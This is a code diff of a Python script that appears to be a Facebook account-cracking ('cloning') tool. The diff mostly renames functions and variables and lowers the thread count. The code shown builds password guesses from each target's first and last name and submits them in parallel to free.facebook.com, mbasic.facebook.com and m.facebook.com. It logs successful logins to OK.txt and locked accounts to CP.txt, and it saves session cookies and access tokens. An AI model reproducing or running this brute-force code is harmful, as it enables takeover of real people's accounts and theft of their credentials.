@@ -32,7 +32,7 @@ except ImportError:
     os.system('pip install bs4')
 
 import requests, os, re, bs4,platform, sys, json, time, random, datetime, subprocess, threading, itertools,base64,uuid,zlib
-from concurrent.futures import ThreadPoolExecutor as faisaals
+from concurrent.futures import ThreadPoolExecutor as jamshahrukhs
 from datetime import datetime
 from bs4 import BeautifulSoup
 
@@ -105,9 +105,9 @@ def hasil(OK,cp):
 	    print('\n\n\x1b[1;97m Total OK : \x1b[1;97m %s  \x1b[1;97mOK.txt' % (H, P, str(len(ok))))
 	    print('\x1b[1;97m Total CP :\x1b[1;97m   %s \x1b[1;97mCP.txt' % (H, P, str(len(cp))))
 	    input("\x1b[1;97mPress enter to back  ")
-	    faisalmand()
+	    jam()
 
-def faisalmand():
+def jam():
     os.system('clear')
     print(logo)
     ipm = requests.get(url_ip).json()
@@ -121,28 +121,28 @@ def faisalmand():
     print(' \033[1;96m[06] \033[1;97mRemove Expire Token')
     print('\033[1;96m [00] \033[1;97mExit ')
     print('\033[1;97m══════════════════════════════════════════════')
-    _ffaisal___ = input('\033[1;93m[•] \033[1;97mChoose : ')
-    if _ffaisal___ in ('1', '01'):
+    _jams___ = input('\033[1;93m[•] \033[1;97mChoose : ')
+    if _jams___ in ('1', '01'):
         os.system('python .jam.py')
-    if _ffaisal___ in ('02', '2'):
-        os.system('clear');__xxx__().faissalx(id)
-    if _ffaisal___ in ('3', '03'):
+    if _jams___ in ('02', '2'):
+        os.system('clear');__xxx__().jamssx(id)
+    if _jams___ in ('3', '03'):
     	os.system('clear');publik()
-    if _ffaisal___ in ('4', '04'):
+    if _jams___ in ('4', '04'):
     	os.system('clear');print(logo);sep()
-    if _ffaisal___ in ('5', '05'):
+    if _jams___ in ('5', '05'):
         os.system('clear');dupcutter()
-    if _ffaisal___ in ('6', '06'):
+    if _jams___ in ('6', '06'):
         time.sleep(2)
         os.system('clear');print(logo);print(' Removing Token .');time.sleep(1);os.system('clear');print(logo);print(' Removing Token ..');time.sleep(1);os.system('clear');print(logo);print(' Removing Token ...');time.sleep(2);os.system('clear');print(logo);print('\033[1;91mToken Removed\033[0m');time.sleep(3);os.system('rm -rf access_token.txt'); version()
-    if _ffaisal___ in ('0', '00'):
+    if _jams___ in ('0', '00'):
         os.system('clear');exit('BYE')
 
 
 class __xxx__:
     def __init__(self):
         self.id = []
-    def faissalx(self,id):
+    def jamssx(self,id):
         os.system("clear")
         print(logo)
         self.cnt = input('\033[1;93m[××] \033[1;97mFile Name :\033[1;92m ')
@@ -154,7 +154,7 @@ class __xxx__:
             self.__pler__()
         else:
             print(' [!] Choose Correct One');
-            self.faissalx(id)
+            self.jamssx(id)
     def __metode__(self, user, __chi__, cebok):
         global ok,cp,loop
         sys.stdout.write(f"\r\x1b[1;97m[JANNAT-SULTAN] {loop}~{len(self.id)} \x1b[1;92mOK={len(ok)}\x1b[1;97m/\x1b[1;91mCP={len(cp)} ")
@@ -266,7 +266,7 @@ class __xxx__:
             print('\033[1;93m[~] \033[1;97mTotal Ids : \033[1;92m%s ' % len(self.id))
             print('\033[1;93m[~] \033[1;97mCloning Started \033[1;97m')
             print(47*"-")
-            with faisaals(max_workers=40) as faisaal:
+            with jamshahrukhs(max_workers=30) as jamshahrukh:
                 for zsb in self.id: # Yo Ndak Tau Kok Tanya Saia
                     try:
                         uid, name = zsb.split('|')
@@ -276,13 +276,13 @@ class __xxx__:
                         else:
                             pwx = [name, xz[0] +' '+ xz[1], xz[0].lower() +' '+ xz[1].lower(), xz[0].lower() + xz[1].lower()]
                         if jbg == '1':
-                            faisaal.submit(self.__metode__, uid, pwx, "free.facebook.com")
+                            jamshahrukh.submit(self.__metode__, uid, pwx, "free.facebook.com")
                         elif jbg == '2':
-                            faisaal.submit(self.__metode__, uid, pwx, "mbasic.facebook.com")
+                            jamshahrukh.submit(self.__metode__, uid, pwx, "mbasic.facebook.com")
                         elif jbg == '3':
-                            faisaal.submit(self.__metode__, uid, pwx, "m.facebook.com")
+                            jamshahrukh.submit(self.__metode__, uid, pwx, "m.facebook.com")
                         else:
-                            faisaal.submit(self.__metode__, uid, pwx, "free.facebook.com")
+                            jamshahrukh.submit(self.__metode__, uid, pwx, "free.facebook.com")
                     except:
                         pass
             hasil(ok,cp)
@@ -301,7 +301,7 @@ class __xxx__:
             print('\033[1;93m[~] \033[1;97mTotal Ids : \033[1;92m%s ' % len(self.id))
             print('\033[1;93m[~] \033[1;97mCloning Started Enjoy\033[1;97m')
             print(47*"-")
-            with faisaals(max_workers=40) as faisaal:
+            with jamshahrukhs(max_workers=30) as jamshahrukh:
                 for zsb in self.id: # Yo Ndak Tau Kok Tanya Saia
                     try:
                         uid, name = zsb.split('|')
@@ -311,13 +311,13 @@ class __xxx__:
                         else:
                             pwx = [pp1, pp2, pp3]
                         if jbg == '1':
-                            faisaal.submit(self.__metode__, uid, pwx, "free.facebook.com")
+                            jamshahrukh.submit(self.__metode__, uid, pwx, "free.facebook.com")
                         elif jbg == '2':
-                            faisaal.submit(self.__metode__, uid, pwx, "mbasic.facebook.com")
+                            jamshahrukh.submit(self.__metode__, uid, pwx, "mbasic.facebook.com")
                         elif jbg == '3':
-                            faisaal.submit(self.__metode__, uid, pwx, "m.facebook.com")
+                            jamshahrukh.submit(self.__metode__, uid, pwx, "m.facebook.com")
                         else:
-                            faisaal.submit(self.__metode__, uid, pwx, "free.facebook.com")
+                            jamshahrukh.submit(self.__metode__, uid, pwx, "free.facebook.com")
                     except:
                         pass
             hasil(ok,cp)
@@ -337,7 +337,7 @@ class __xxx__:
             print('\033[1;93m[~] \033[1;97mTotal Ids : \033[1;92m%s ' % len(self.id))
             print('\033[1;93m[~] \033[1;97mCloning Started Enjoy\033[1;97m')
             print(47*"-")
-            with faisaals(max_workers=40) as faisaal:
+            with jamshahrukhs(max_workers=30) as jamshahrukh:
                 for zsb in self.id: 
                     try:
                         uid, name = zsb.split('|')
@@ -347,13 +347,13 @@ class __xxx__:
                         else:
                             pwx = [xz[0]+pxp1, xz[0]+pxp2, xz[0]+pxp3, xz[1]+ptp4]
                         if jbg == '1':
-                            faisaal.submit(self.__metode__, uid, pwx, "free.facebook.com")
+                            jamshahrukh.submit(self.__metode__, uid, pwx, "free.facebook.com")
                         elif jbg == '2':
-                            faisaal.submit(self.__metode__, uid, pwx, "mbasic.facebook.com")
+                            jamshahrukh.submit(self.__metode__, uid, pwx, "mbasic.facebook.com")
                         elif jbg == '3':
-                            faisaal.submit(self.__metode__, uid, pwx, "m.facebook.com")
+                            jamshahrukh.submit(self.__metode__, uid, pwx, "m.facebook.com")
                         else:
-                            faisaal.submit(self.__metode__, uid, pwx, "free.facebook.com")
+                            jamshahrukh.submit(self.__metode__, uid, pwx, "free.facebook.com")
                     except:
                         pass
             hasil(ok,cp)
@@ -367,7 +367,7 @@ class __xxx__:
             print('\033[1;93m[~] \033[1;97mTotal Ids : \033[1;92m%s ' % len(self.id))
             print('\033[1;93m[~] \033[1;97mCloning Started Enjoy\033[1;97m')
             print(47*"-")
-            with faisaals(max_workers=40) as faisaal:
+            with jamshahrukhs(max_workers=30) as jamshahrukh:
                 for zsb in self.id: 
                     try:
                         uid, name = zsb.split('|')
@@ -377,13 +377,13 @@ class __xxx__:
                         else:
                             pwx = [name, xz[0].lower() +' '+ xz[1].lower()]
                         if jbg == '1':
-                            faisaal.submit(self.__metode__, uid, pwx, "free.facebook.com")
+                            jamshahrukh.submit(self.__metode__, uid, pwx, "free.facebook.com")
                         elif jbg == '2':
-                            faisaal.submit(self.__metode__, uid, pwx, "mbasic.facebook.com")
+                            jamshahrukh.submit(self.__metode__, uid, pwx, "mbasic.facebook.com")
                         elif jbg == '3':
-                            faisaal.submit(self.__metode__, uid, pwx, "m.facebook.com")
+                            jamshahrukh.submit(self.__metode__, uid, pwx, "m.facebook.com")
                         else:
-                            faisaal.submit(self.__metode__, uid, pwx, "free.facebook.com")
+                            jamshahrukh.submit(self.__metode__, uid, pwx, "free.facebook.com")
                     except:
                         pass
             hasil(ok,cp)
@@ -427,7 +427,7 @@ def sep():
     print(54*"\033[1;33m_")
     print("")
     input('\033[1;32m Press enter to back ')
-    faisalmand()
+    jam()
 ####
 def dupcutter():
 	os.system('clear');print(logo)
@@ -456,7 +456,7 @@ def _f_a_md__eck():
       print("\033[1;92mYour Token is successfully Approved")
       msg = str(os.geteuid())
       time.sleep(0.3)
-      faisalmand()
+      jam()
       pass
     else:
       print("\x1b[37;1mYour Token :\033[1;92m "+id)
@@ -510,7 +510,7 @@ def login():
         coki = {'cookie':cookie} 
         open('login/cookie.txt','w').write(cookie)
         open('login/token.txt','w').write(token)
-        faisalmand()
+        jam()
     except requests.exceptions.ConnectionError:print('\n   %s[%s•%s] %sNo Internet %s!%s\n'%(M,P,M,P,M,P));exit()
     except (KeyError,IOError,AttributeError):print('\n   %s[%s•%s] %sCookies Invalid %s!%s\n'%(M,P,M,P,M,P));exit()
 
